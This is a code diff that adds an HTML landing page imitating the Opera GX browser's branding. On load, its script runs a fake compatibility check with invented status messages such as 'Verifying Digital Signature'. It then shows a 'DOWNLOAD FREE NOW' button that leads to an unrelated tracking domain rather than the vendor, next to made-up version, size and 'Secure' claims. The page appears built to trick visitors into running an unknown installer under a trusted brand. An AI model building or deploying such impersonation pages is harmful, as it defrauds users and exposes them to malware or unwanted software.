@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Opera GX - The #1 Browser for Gamers (US)</title>
+    <style>
+        :root {
+            --primary-color: #fa1e4e; /* Opera GX Red */
+            --secondary-color: #8a2be2; /* Violet accent */
+            --bg-color: #0d0d0d;
+            --text-color: #ffffff;
+            --card-bg: #1a1a1a;
+            --success-color: #00ff88;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            overflow-x: hidden;
+            padding-bottom: 60px;
+        }
+
+        /* Header */
+        header {
+            padding: 20px 5%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: rgba(13, 13, 13, 0.95);
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            border-bottom: 1px solid #333;
+            backdrop-filter: blur(5px);
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: var(--text-color);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            cursor: default;
+        }
+
+        .logo span { color: var(--primary-color); }
+
+        /* US Badge Style */
+        .region-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 5px 12px;
+            border-radius: 20px;
+            border: 1px solid #333;
+            font-size: 0.8rem;
+            color: #ccc;
+            font-weight: 600;
+        }
+
+        /* Hero Section */
+        .hero {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 120px 20px 40px;
+            background: radial-gradient(circle at center, #2a0a14 0%, #0d0d0d 70%);
+        }
+
+        h1 {
+            font-size: 3.5rem;
+            margin-bottom: 20px;
+            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: fadeInDown 1s ease;
+            line-height: 1.2;
+        }
+
+        .sub-headline {
+            font-size: 1.2rem;
+            color: #ccc;
+            max-width: 600px;
+            margin-bottom: 40px;
+            animation: fadeInUp 1.2s ease;
+        }
+
+        /* Simulation Box */
+        .check-box {
+            background: var(--card-bg);
+            padding: 30px;
+            border-radius: 12px;
+            border: 1px solid #333;
+            box-shadow: 0 0 30px rgba(250, 30, 78, 0.15);
+            width: 100%;
+            max-width: 480px;
+            position: relative;
+            overflow: hidden;
+            transition: transform 0.3s;
+        }
+
+        .status-text {
+            font-size: 1.1rem;
+            font-weight: bold;
+            margin-bottom: 15px;
+            color: #fff;
+            min-height: 25px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #333;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: var(--primary-color);
+            transition: width 0.1s linear;
+            box-shadow: 0 0 10px var(--primary-color);
+        }
+
+        /* The CTA Button */
+        .cta-btn {
+            display: none;
+            background: var(--primary-color);
+            color: white;
+            padding: 16px 30px;
+            font-size: 1.3rem;
+            font-weight: 800;
+            text-decoration: none;
+            border-radius: 6px;
+            text-transform: uppercase;
+            transition: all 0.3s ease;
+            border: 2px solid var(--primary-color);
+            cursor: pointer;
+            width: 100%;
+            text-align: center;
+            letter-spacing: 1px;
+            margin-top: 10px;
+        }
+
+        .cta-btn:hover {
+            background: transparent;
+            color: var(--primary-color);
+            box-shadow: 0 0 20px rgba(250, 30, 78, 0.6);
+            transform: scale(1.02);
+        }
+
+        /* Technical Specs Block */
+        .tech-specs {
+            display: none;
+            margin-top: 20px;
+            padding-top: 15px;
+            border-top: 1px solid #333;
+            font-size: 0.85rem;
+            color: #888;
+            text-align: left;
+            line-height: 1.8;
+        }
+
+        .tech-specs strong { color: #ccc; }
+        
+        .secure-badge {
+            color: var(--success-color);
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            margin-top: 5px;
+            font-weight: bold;
+            font-size: 0.9rem;
+        }
+
+        /* Features Grid */
+        .features {
+            padding: 60px 10%;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 30px;
+            background: #111;
+        }
+
+        .feature-card {
+            background: var(--card-bg);
+            padding: 25px;
+            border-radius: 8px;
+            border-left: 3px solid var(--primary-color);
+            transition: transform 0.3s;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-5px);
+            background: #222;
+        }
+
+        .feature-title {
+            font-size: 1.1rem;
+            margin-bottom: 10px;
+            color: #fff;
+            font-weight: bold;
+        }
+
+        .feature-desc {
+            font-size: 0.9rem;
+            color: #aaa;
+        }
+
+        /* Footer */
+        footer {
+            padding: 30px;
+            text-align: center;
+            font-size: 0.8rem;
+            color: #555;
+            background: #0d0d0d;
+            border-top: 1px solid #222;
+        }
+
+        /* Cookie Banner */
+        .cookie-banner {
+            position: fixed;
+            bottom: -100px;
+            left: 0;
+            width: 100%;
+            background: rgba(20, 20, 20, 0.98);
+            border-top: 2px solid var(--primary-color);
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+            z-index: 9999;
+            transition: bottom 0.5s ease-in-out;
+            box-shadow: 0 -5px 20px rgba(0,0,0,0.5);
+            flex-wrap: wrap;
+        }
+
+        .cookie-text {
+            font-size: 0.9rem;
+            color: #ddd;
+            max-width: 800px;
+        }
+
+        .cookie-btn {
+            background: #fff;
+            color: #000;
+            border: none;
+            padding: 10px 25px;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .cookie-btn:hover {
+            background: var(--primary-color);
+            color: #fff;
+        }
+
+        /* Mobile Adjustments */
+        @media (max-width: 768px) {
+            h1 { font-size: 2.2rem; }
+            .hero { padding: 100px 15px 40px; }
+            .cookie-banner { flex-direction: column; text-align: center; gap: 10px; }
+            .region-badge span { display: none; } /* Show only flag on very small screens if needed, but here we keep both */
+        }
+
+        /* Animations */
+        @keyframes fadeInDown {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="logo">
+            OPERA <span>GX</span>
+        </div>
+        <div class="region-badge">
+            <svg width="24" height="16" viewBox="0 0 36 24" xmlns="http://www.w3.org/2000/svg">
+                <rect width="36" height="24" fill="#B22234"/>
+                <rect y="2.2" width="36" height="2.2" fill="#FFF"/>
+                <rect y="6.6" width="36" height="2.2" fill="#FFF"/>
+                <rect y="11" width="36" height="2.2" fill="#FFF"/>
+                <rect y="15.4" width="36" height="2.2" fill="#FFF"/>
+                <rect y="19.8" width="36" height="2.2" fill="#FFF"/>
+                <rect width="14.4" height="12.8" fill="#3C3B6E"/>
+                <path d="M2 2h1v1H2zM5 2h1v1H5zM8 2h1v1H8zM11 2h1v1H11zM3.5 4h1v1H3.5zM6.5 4h1v1H6.5zM9.5 4h1v1H9.5zM12.5 4h1v1H12.5zM2 6h1v1H2zM5 6h1v1H5zM8 6h1v1H8zM11 6h1v1H11zM3.5 8h1v1H3.5zM6.5 8h1v1H6.5zM9.5 8h1v1H9.5zM12.5 8h1v1H12.5zM2 10h1v1H2zM5 10h1v1H5zM8 10h1v1H8zM11 10h1v1H11z" fill="#FFF"/>
+            </svg>
+            US EDITION
+        </div>
+    </header>
+
+    <section class="hero">
+        <h1>The #1 Browser<br>for US Gamers</h1>
+        <p class="sub-headline">Limit CPU, RAM, and Network usage. Get higher FPS and lower ping in your favorite games.</p>
+        
+        <div class="check-box">
+            <div id="statusText" class="status-text">Checking System Compatibility...</div>
+            <div class="progress-bar">
+                <div id="progressFill" class="progress-fill"></div>
+            </div>
+            
+            <a href="https://data527.click/066b274b46d5099a583d/b39211faba/?placementName=default" class="cta-btn" id="downloadBtn">
+                DOWNLOAD FREE NOW
+            </a>
+            
+            <p id="systemNote" style="font-size: 0.8rem; color: #777; margin-top: 10px;">
+                Optimized for Windows 10/11 & macOS
+            </p>
+
+            <div id="techSpecs" class="tech-specs">
+                <div style="display: flex; justify-content: space-between;">
+                    <span><strong>Version:</strong> US-123.0 (Latest)</span>
+                    <span><strong>Size:</strong> 2.8 MB</span>
+                </div>
+                <div style="margin-top: 5px;"><strong>License:</strong> Freeware / Full Access</div>
+                <div class="secure-badge">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1ZM12 11.99H19C18.47 16.11 15.72 19.78 12 20.93V12H5V6.3L12 3.19V11.99Z" />
+                    </svg>
+                    Secure & CCPA Compliant
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="features">
+        <div class="feature-card">
+            <div class="feature-title">⚡ GX Control</div>
+            <p class="feature-desc">Cap your RAM and CPU usage. Don't let your browser kill your FPS.</p>
+        </div>
+        <div class="feature-card">
+            <div class="feature-title">🎮 Twitch Sidebar</div>
+            <p class="feature-desc">Never miss a stream. Twitch and Discord are integrated directly into your sidebar.</p>
+        </div>
+        <div class="feature-card">
+            <div class="feature-title">🎨 US Theme Pack</div>
+            <p class="feature-desc">Fully customizable colors, themes, and dark mode. Your browser, your rules.</p>
+        </div>
+    </section>
+
+    <footer>
+        <p>&copy; 2025 Opera Gaming Reviews. All rights reserved. <br> <a href="#" style="color:#555; text-decoration:none;">Privacy Policy</a> | <a href="#" style="color:#555; text-decoration:none;">Terms of Service</a></p>
+    </footer>
+
+    <div id="cookieBanner" class="cookie-banner">
+        <div class="cookie-text">
+            We use cookies to improve your experience and analyze traffic. By using this website, you agree to our cookie policy.
+        </div>
+        <button class="cookie-btn" onclick="acceptCookies()">Accept</button>
+    </div>
+
+    <script>
+        // Simulation Script
+        const progressFill = document.getElementById('progressFill');
+        const statusText = document.getElementById('statusText');
+        const downloadBtn = document.getElementById('downloadBtn');
+        const systemNote = document.getElementById('systemNote');
+        const progressBar = document.querySelector('.progress-bar');
+        const techSpecs = document.getElementById('techSpecs');
+        const cookieBanner = document.getElementById('cookieBanner');
+
+        let width = 0;
+        
+        // Check if cookies were already accepted
+        if (!localStorage.getItem('cookiesAccepted')) {
+            setTimeout(() => {
+                cookieBanner.style.bottom = '0';
+            }, 1000); 
+        }
+
+        function acceptCookies() {
+            localStorage.setItem('cookiesAccepted', 'true');
+            cookieBanner.style.bottom = '-200px';
+        }
+
+        function simulateLoading() {
+            const interval = setInterval(() => {
+                if (width >= 100) {
+                    clearInterval(interval);
+                    finishLoading();
+                } else {
+                    width++;
+                    progressFill.style.width = width + '%';
+                    
+                    // US-Specific Simulation Steps
+                    if(width === 20) statusText.innerText = "Pinging US-East Servers (12ms)...";
+                    if(width === 50) statusText.innerText = "Optimizing route for ISP...";
+                    if(width === 75) statusText.innerText = "Verifying Digital Signature...";
+                    if(width === 90) statusText.innerText = "Finalizing Installer Package...";
+                }
+            }, 35); // Slightly faster for US impatience
+        }
+
+        function finishLoading() {
+            statusText.innerText = "Ready to Install!";
+            statusText.style.color = "#00ff88"; // Success Green
+            statusText.style.fontSize = "1.2rem";
+            
+            // Hide progress bar, show button and specs
+            progressBar.style.display = 'none';
+            systemNote.style.display = 'none';
+            
+            downloadBtn.style.display = 'block';
+            techSpecs.style.display = 'block';
+        }
+
+        // Start simulation on page load
+        window.onload = simulateLoading;
+    </script>
+    
+</body>
+</html>
